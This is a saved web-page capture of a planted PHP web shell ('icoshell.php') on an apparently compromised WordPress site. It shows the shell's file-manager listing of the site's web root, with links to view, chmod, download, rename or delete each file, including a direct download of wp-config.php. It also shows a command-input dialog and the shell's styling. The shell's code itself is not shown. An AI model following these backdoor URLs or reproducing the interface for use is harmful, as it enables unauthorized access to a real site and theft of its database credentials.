		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=default.php">default.php</a></td>
		<td class="center">15.99 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=default.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/default.php&amp;2=ajx-download" download="default.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=googlecc9f7e23b58e655b.html">googlecc9f7e23b58e655b.html</a></td>
		<td class="center">53 B</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=googlecc9f7e23b58e655b.html">-rw-r--r--</a></td>
		<td class="center">2025-08-23 00:12</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/googlecc9f7e23b58e655b.html&amp;2=ajx-download" download="googlecc9f7e23b58e655b.html">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=icoshell.php">icoshell.php</a></td>
		<td class="center">24.44 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=icoshell.php">-rw-r--r--</a></td>
		<td class="center">2025-08-20 15:09</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/icoshell.php&amp;2=ajx-download" download="icoshell.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=index.php">index.php</a></td>
		<td class="center">405 B</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=index.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/index.php&amp;2=ajx-download" download="index.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=license.txt">license.txt</a></td>
		<td class="center">19.45 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=license.txt">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/license.txt&amp;2=ajx-download" download="license.txt">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=monarx-analyzer.php">monarx-analyzer.php</a></td>
		<td class="center">3.75 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=monarx-analyzer.php">-rw-r--r--</a></td>
		<td class="center">2025-08-14 14:34</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/monarx-analyzer.php&amp;2=ajx-download" download="monarx-analyzer.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=readme.html">readme.html</a></td>
		<td class="center">7.24 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=readme.html">-rw-r--r--</a></td>
		<td class="center">2025-08-06 19:38</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/readme.html&amp;2=ajx-download" download="readme.html">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=robots.txt">robots.txt</a></td>
		<td class="center">93 B</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=robots.txt">-rw-r--r--</a></td>
		<td class="center">2025-08-23 00:12</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/robots.txt&amp;2=ajx-download" download="robots.txt">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=sitemap.xml">sitemap.xml</a></td>
		<td class="center">499 B</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=sitemap.xml">-rw-r--r--</a></td>
		<td class="center">2025-08-23 00:18</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/sitemap.xml&amp;2=ajx-download" download="sitemap.xml">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=wp-activate.php">wp-activate.php</a></td>
		<td class="center">7.21 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-activate.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-activate.php&amp;2=ajx-download" download="wp-activate.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[d]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-admin&amp;2=open">wp-admin</a></td>
		<td class="center">-</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-admin">drwxr-xr-x</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a>+file</a> <a>+dir</a> <a>up</a> <a>rename</a> <a>del</a></td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=wp-blog-header.php">wp-blog-header.php</a></td>
		<td class="center">351 B</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-blog-header.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-blog-header.php&amp;2=ajx-download" download="wp-blog-header.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=wp-comments-post.php">wp-comments-post.php</a></td>
		<td class="center">2.27 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-comments-post.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-comments-post.php&amp;2=ajx-download" download="wp-comments-post.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=wp-config-sample.php">wp-config-sample.php</a></td>
		<td class="center">3.26 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-config-sample.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-config-sample.php&amp;2=ajx-download" download="wp-config-sample.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=wp-config.php">wp-config.php</a></td>
		<td class="center">3.47 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-config.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:35</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-config.php&amp;2=ajx-download" download="wp-config.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[d]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-content&amp;2=open">wp-content</a></td>
		<td class="center">-</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-content">drwxr-xr-x</a></td>
		<td class="center">2025-02-19 05:35</td>
		<td class="right"><a>+file</a> <a>+dir</a> <a>up</a> <a>rename</a> <a>del</a></td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=wp-cron.php">wp-cron.php</a></td>
		<td class="center">5.49 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-cron.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-cron.php&amp;2=ajx-download" download="wp-cron.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[d]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-includes&amp;2=open">wp-includes</a></td>
		<td class="center">-</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-includes">drwxr-xr-x</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a>+file</a> <a>+dir</a> <a>up</a> <a>rename</a> <a>del</a></td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=wp-links-opml.php">wp-links-opml.php</a></td>
		<td class="center">2.44 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-links-opml.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-links-opml.php&amp;2=ajx-download" download="wp-links-opml.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=wp-load.php">wp-load.php</a></td>
		<td class="center">3.84 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-load.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-load.php&amp;2=ajx-download" download="wp-load.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=wp-login.php">wp-login.php</a></td>
		<td class="center">50.16 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-login.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-login.php&amp;2=ajx-download" download="wp-login.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=wp-mail.php">wp-mail.php</a></td>
		<td class="center">8.34 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-mail.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-mail.php&amp;2=ajx-download" download="wp-mail.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=wp-settings.php">wp-settings.php</a></td>
		<td class="center">28.35 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-settings.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-settings.php&amp;2=ajx-download" download="wp-settings.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=wp-signup.php">wp-signup.php</a></td>
		<td class="center">33.58 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-signup.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-signup.php&amp;2=ajx-download" download="wp-signup.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=wp-trackback.php">wp-trackback.php</a></td>
		<td class="center">4.98 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=wp-trackback.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/wp-trackback.php&amp;2=ajx-download" download="wp-trackback.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>

	<tr class="trFl">
		<td class="typeTd">[f]&nbsp;</td>
		<td><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=file&amp;02=xmlrpc.php">xmlrpc.php</a></td>
		<td class="center">3.17 KiB</td>
		<td class="center"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html&amp;2=chmod&amp;02=xmlrpc.php">-rw-r--r--</a></td>
		<td class="center">2025-02-19 05:30</td>
		<td class="right"><a href="https://bobanevada.com/icoshell.php?0=/home/u757089673/domains/bobanevada.com/public_html/xmlrpc.php&amp;2=ajx-download" download="xmlrpc.php">download</a> <a>rename</a> <a>del</a> </td>
	</tr>
</tbody></table>

<div id="confirModal" class="modal">
	<div class="modal-content">
		<span id="question"></span>
		<span class="frdo">
			<a id="confirmTrue">[ yes ]</a>
			<a id="confirmf">[ no ]</a>
		</span>
	</div>
</div>

<div id="commandModal" class="modal">
	<div class="modal-content">
		<label for="commandInput" id="inputLabelWord"></label>
		<input type="text" id="commandInput" autocomplete="off">
		<span class="frdo">
			<a id="submitCommand">[ submit ]</a>
			<a id="abortCommand">[ cancel ]</a>
		</span>
	</div>
</div>


<div id="mynotification" class="modal">
	<div class="modal-content" id="notificationBlock">
		<span id="notificationText"></span>
		<span class="frdo">
			<a id="confirmOk">[ ok ]</a>
		</span>
	</div>
</div>








</body></html>
------MultipartBoundary--BfyQyNsmEo5JvEfn8JoT5WnpEWVSSiDrkeqlzHIO13----
Content-Type: text/css
Content-Transfer-Encoding: binary
Content-Location: cid:css-5fe598e1-4856-44b1-b8f7-2cb814f3e8d4@mhtml.blink

@charset "utf-8";

body, input, button, a { color: white; }

body { background: black; font-family: monospace; font-size: 120%; }

.border { border: 1px solid white; }

input, button, .modal-content { border: 1px solid gray; border-radius: 3px; background: transparent; }

hr { border-right: none; border-bottom: none; border-left: none; border-image: initial; border-top: 1px solid gray; }

a { cursor: pointer; text-decoration: none; }

table { border-collapse: collapse; }

iframe { border: 0px; }

textarea { resize: none; }

input, .center, .phdiv { text-align: center; }

.left { text-align: left; float: left; }

.typeTd { width: 0px; }

.mainTable, .tdB { width: 100%; }

.noName { width: 11%; }

.fileAct { width: 20%; }

.shact { width: auto; font-weight: bold; }

.shact, .tdH { white-space: nowrap; }

.pth { color: gray; }

.chTable { width: 40%; left: 30%; }

.chTable, .phdiv { top: 10%; position: absolute; }

.right { text-align: right; }

.phdiv, .modal-content { width: 80%; }

.phdiv { left: 10%; height: 75%; }

.phpinfo { width: 100%; height: 100%; }

.trFl:hover, .trFl:hover a, .bgwhite { background: white; color: black; }

.typehead { width: 1%; }

.modal { display: none; position: fixed; z-index: 1; top: 0px; left: 0px; width: 100%; height: 100%; overflow: auto; background: black; }

.modal-content { border: 2px solid gray; background-color: black; padding: 10px; margin: 0px; position: absolute; top: 45%; left: 50%; transform: translate(-50%, -50%); }

.frdo { float: right; }

.lineBreak { line-break: anywhere; }

.shellOutput { text-align: left; overflow: hidden scroll; height: 100%; }

.inpbold { font-weight: bold; border: 0px; text-align: left; }
------MultipartBoundary--BfyQyNsmEo5JvEfn8JoT5WnpEWVSSiDrkeqlzHIO13------
